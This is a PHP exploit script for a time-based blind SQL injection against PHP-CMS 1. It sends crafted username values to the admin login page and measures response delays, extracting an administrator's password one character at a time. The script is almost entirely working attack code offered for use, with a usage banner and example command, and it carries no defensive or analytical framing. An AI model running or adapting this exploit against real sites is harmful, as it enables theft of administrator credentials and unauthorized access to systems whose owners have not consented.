--+++===================================================+++--
--+++====== PHP-CMS 1 Blind SQL Injection Exploit ======+++--
--+++===================================================+++--

<?php

function query ($user, $pos, $chr)
{
	$query = "x' OR IF((ASCII(SUBSTRING((SELECT password FROM ".
		 "admin WHERE username='{$user}'),{$pos},1))={$chr}),BENCHMARK".
		 "(100000000,CHAR(0)),0) OR '1' = '2";

	return $query;
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$chr = ord ($chr);

	$fp = fsockopen ($hostname, 80);

	$post = "username=".query ($user, $pos, $chr) . "&password=x&Submit=ok";
	
	$req =  "POST {$path}/admin/login.php HTTP/1.1\r\n".
		"Host: {$hostname}\r\n".
		"Connection: Close\r\n".
		"Content-Type: application/x-www-form-urlencoded\r\n".
		"Content-Length: " . strlen ($post) . "\r\n\r\n".
		$post;
	
	fputs ($fp, $req);

	$start = time ();
	while (!feof ($fp))
		fgets ($fp, 1024);
	
	$end = time ();

	fclose ($fp);

	if ($end - $start > 4)
		return true;
	else
		return false;
	
}

function usage ()
{
	echo
		"\nPHP-CMS 1 Blind SQL Injection Exploit".
		"\n[+] Author  : darkjoker".
		"\n[+] Site    : http://darkjoker.net23.net".
		"\n[+] Download: http://heanet.dl.sourceforge.net/sourceforge/php-cms-project/phpcms.zip".
		"\n[+] Usage   : php xpl.php <hostname> <path> <username> [<keylist>]".
		"\n[+] Ex.     : php xpl.php localhost /PHPCMS admin abcdefghijklmnopqrstuvwxyz".
		"\n[+] Greetz  : my girlfriend, Vivi".
		"\n\n";
	exit ();
}



if ($argc < 3)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = (empty ($argv [4])) ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" : $argv [4];
$pos = 1;
$chr = 0;

echo "[+] Password: ";
while ($chr < strlen ($key))
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}

echo "\n\n";

?>
